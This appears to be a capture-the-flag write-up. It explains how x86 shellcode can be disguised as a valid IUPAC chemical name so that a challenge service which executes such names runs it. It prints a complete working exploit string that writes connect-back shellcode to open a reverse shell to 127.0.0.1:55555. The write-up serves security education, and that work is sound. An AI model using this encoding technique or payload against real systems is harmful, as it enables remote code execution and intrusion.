## TNT - Misc 500

### Overview

This challenge is a service that accepts a string, uses the [opsin library](https://github.com/metamolecular/opsin) to check if it's a valid [IUPAC organic chemical name](https://en.wikipedia.org/wiki/IUPAC_nomenclature_of_organic_chemistry) (for example, the string `2,4,6-trinitrotoluene`), and if so executes the string as x86 code.

### Solution

The string is placed in RWX memory at 0x2468000; my solution was to come up with a payload (that was also a valid chemical name) that could output arbitrary bytes to 0x2469000. This way, when the payload was done running, it would fall through to my arbitrary bytes—which I chose to be connect-back shellcode.

What kind of x86 instructions do we have available to us within a chemical name? The uppercase letters are all single-byte instructions that cover most of the `inc`/`dec`/`push`/`pop` a register instructions. `h` and `j` are `push imm32` and `push imm8`, which are useful even though we won't be able to control the immediate operands fully—sadly, no valid chemical name has `h\xcd\x80\x90\x90` as a substring :P. Three additional instructions I used were `xor [ebp+0x4e], eax` (which encodes to bytes `1EN`) for writing to memory, and `sub eax, imm32` (bytes `-xxxx`) and `xor eax, imm32` (bytes `5xxx`) for manipulating `eax`.

CTF tip: [ref.x86asm.net](http://ref.x86asm.net/coder32.html) has a good table for figuring this kind of stuff out; it's easy to check for instructions with alphanumeric opcodes, and specifically ones that don't take any `r/m32` operands and thus are easy to use inside a restricted ASCII context without worrying about segfaults.

How do we generate a giant chemical name that allows for sticking in lots of instructions? My chemical name was roughly in the form of `[foo-bar-hect1ene]-[spam-eggs-hect1ene]-hectane`. Chemically, this example means a "hectane" molecule with a "foo-bar-hect1ene" and a "spam-eggs-hect1ene" attached to it; these in turn mean "hect1ene" molecules with stuff attached to them. The brackets in the name work like parenthesis, and both hectane and hect1ene are huge molecules that allow me to attach lots of things. I can choose "foo" and "bar" from [the names of various chemistry thingies](https://github.com/metamolecular/opsin/blob/master/opsin-core/src/main/resources/uk/ac/cam/ch/wwmm/opsin/resources), but with lots of restrictions. I basically just brute-forced strings from those XML files to find thingies (technically called [substituents](https://en.wikipedia.org/wiki/Substituent)) that I could use in basically any order I wanted to without the opsin library rejecting my chemical name.

My resulting payload was ~3000 characters, consisting mostly of a couple dozen hect1ene-based groups, e.g.:
```[RheNA-OXA-    5cbz -iodo-iodo-fmoc-iodo-fmoc-bara-cura-thia-fmoc-iodo-aza-PHOSPha   PHOSPha   PHOSPha   PHOSPha   PHOSPha   PHOSPha   NEPTUNA-hect1ENE]```
As shown, I abused the fact that the opsin library is case-insensitive and premissive about extra whitespace. Ignoring the extraneous instructions, the disassembly of this string is `push 0x2d414e65; pop eax; xor eax,0x207a6263; sub eax,0x6f646f69; ~10 more different 'sub eax 0xfoo's; dec eax; dec eax; more 'dec eax's; xor [ebp+0x4e], eax`. Via choosing different substituents, I could `pop`/`xor`/`sub` `eax` with different constants to roughly set it, and then `dec eax` to get the value exactly right before writing it out to memory with `xor [ebp+0x4e], eax`. Of course, `ebp` needs to point somewhere useful beforehand, which I did by controlling `eax` as above and then just `push eax; pop ebp`ing (`[PROPIO]-` is a valid component of a chemical name that will do that). By repeating this process with `inc ebp`s in between (which encodes to just `E`), my chemical name writes out connect-back shellcode to immediately after itself in memory.

The attached script `make_name.py` will generate an exploit string, and has some comments explaining more details. A working example that connects back to 127.0.0.1:55555 is
```
[ThiYl-OXA-    5cbz -soda-tms -oxa -tms -fmoc-keto-cbz -keto-osma-fmoc-tms PHOSPha   PHOSPha   PHOSPha   PHOSPha   PHOSPha   PHOSPha   HECTANE]-    [PROPIO]-    [RheNA-OXA-    5cbz -iodo-iodo-fmoc-iodo-fmoc-bara-cura-thia-fmoc-iodo-aza-PHOSPha   PHOSPha   PHOSPha   PHOSPha   PHOSPha   PHOSPha   NEPTUNA-hect1ENE]-   hECTENE-    [ThORA OXA-    5fmoc-fmoc-cera-ioda-rada-amyl-iodo-oxa-PHOSPha   PHOSPha   PHOSPha   NEPTUNA-hect1ENE]-   hECTENE-    [ThorA OXA-    5fmoc-arso-sila-cbz -thia-cbz -cbz -cbz -oxyl-tms -iodo-soda-cura-amyl-cbz -oxyl-oxyl-keto-osma-cbz -tms PHOSPha   PHOSPha   PHOSPha   PHOSPha   PHOSPha   PHOSPha   PHOSPha   PHOSPha   PHOSPha   PHOSPha   PHOSPha   PHOSPha   PHOSPha   PHOSPha   PHOSPha   PHOSPha   PHOSPha   PHOSPha   NEPTUNA-hect1ENE]-   hECTENE-    [RheNA OXA-    5fmoc-tms -thia-amyl-bora-arsa-thia-fmoc-oxo PHOSPha   PHOSPha   PHOSPha   PHOSPha   PHOSPha   PHOSPha   PHOSPha   NEPTUNA-hect1ENE]-   hECTENE-    [ThiyL OXA-    5fmoc-oxa -boc -oxyl-oxa -oxa -oxa -boc -oxa -sila-thia-osma-tms PHOSPha   PHOSPha   PHOSPha   PHOSPha   PHOSPha   PHOSPha   NEPTUNA-hect1ENE]-   hECTENE-    [ThoRA OXA-    5fmoc-iodo-oxyl-cbz -erba-ioda-aza-PHOSPha   PHOSPha   PHOSPha   PHOSPha   PHOSPha   NEPTUNA-hect1ENE]-   hECTENE-    [5oxyl-cura-amyl-amyl-bora-aura-cera-amyl-iodo-arso-iodo-fmoc-fmoc-oxo -oxa PHOSPha   PHOSPha   PHOSPha   NEPTUNA-hect1ENE]-   hECTENE-    [ThULa-OXA-    5erba-arsa-arsa-amyl-cera-bora-thia-thia-rada-amyl-cbz -aura-cera-cera-cera-bara-boc-PHOSPha   NEPTUNA-hect1ENE]-   hECTENE-    [ThIYl OXA-    5tms -aza -tms -fmoc-cbz -arso-arso-bora-cbz-PHOSPha   PHOSPha   PHOSPha   NEPTUNA-hect1ENE]-   hECTENE-    [ThORA-OXA-    5tms -bara-cbz -fmoc-cbz -iodo-aza -oxa -cura-oxa -bara-amyl-amyl-cera-rada-cbz-PHOSPha   PHOSPha   PHOSPha   PHOSPha   PHOSPha   NEPTUNA-hect1ENE]-   hECTENE-    [ThuLA OXA-    5fmoc-oxyl-oxyl-iodo-rada-tms -oxyl-aza -cbz-PHOSPha   PHOSPha   PHOSPha   PHOSPha   PHOSPha   NEPTUNA-hect1ENE]-   hECTENE-    [ThIYL-OXA-    5tms -erba-thia-erba-fmoc-bora-aza -bora-cera-erba-aza PHOSPha   NEPTUNA-hect1ENE]-   hECTENE-    [RhOdA OXA-    5boc -oxyl-oxo -ioda-aza -aza -soda-thia-ioda-oxa -oxa -aza -oxa -aza -aza-PHOSPha   PHOSPha   PHOSPha   PHOSPha   PHOSPha   PHOSPha   PHOSPha   PHOSPha   PHOSPha   PHOSPha   PHOSPha   PHOSPha   NEPTUNA-hect1ENE]-   hECTENE-    [ThORA-OXA-    5amyl-amyl-amyl-oxo -boc -cera-amyl-rada-fmoc-keto-cbz PHOSPha   PHOSPha   PHOSPha   PHOSPha   PHOSPha   PHOSPha   PHOSPha   PHOSPha   NEPTUNA-hect1ENE]-   hECTENE-    [5arso-tms -amyl-erba-tms -bora-tms -thia-tms -fmoc-tms-PHOSPha   PHOSPha   PHOSPha   PHOSPha   PHOSPha   PHOSPha   PHOSPha   NEPTUNA-hect1ENE]-   hECTENE-    [RheNa OXA-    5fmoc-oxyl-oxyl-ioda-bara-tms -thia-thia-rada-tms -tms -thia-tms -inda-soda-aza PHOSPha   PHOSPha   PHOSPha   PHOSPha   PHOSPha   PHOSPha   PHOSPha   PHOSPha   NEPTUNA-hect1ENE]-   hECTENE-    [RhenA-OXA-    5boc -thia-sila-sila-fmoc-thia-tms -tms -tms NEPTUNA-hect1ENE]-   hECTENE-    [RhOda OXA-    5boc -cbz -cbz -amyl-cbz -amyl-cbz -arso-amyl-arsa-fmoc-amyl-aura-bara-aza-NEPTUNA-hect1ENE]-   hECTENE-    [ThorA OXA-    5cbz -amyl-arso-thia-keto-iodo-iodo-boc PHOSPha   PHOSPha   PHOSPha   PHOSPha   NEPTUNA-hect1ENE]-   hECTENE-    [ThiyL OXA-    5amyl-erba-ioda-osma-fmoc-boc -aza -oxa -aza -aza -oxa PHOSPha   PHOSPha   PHOSPha   PHOSPha   HECTENE]-    HECTANE
```
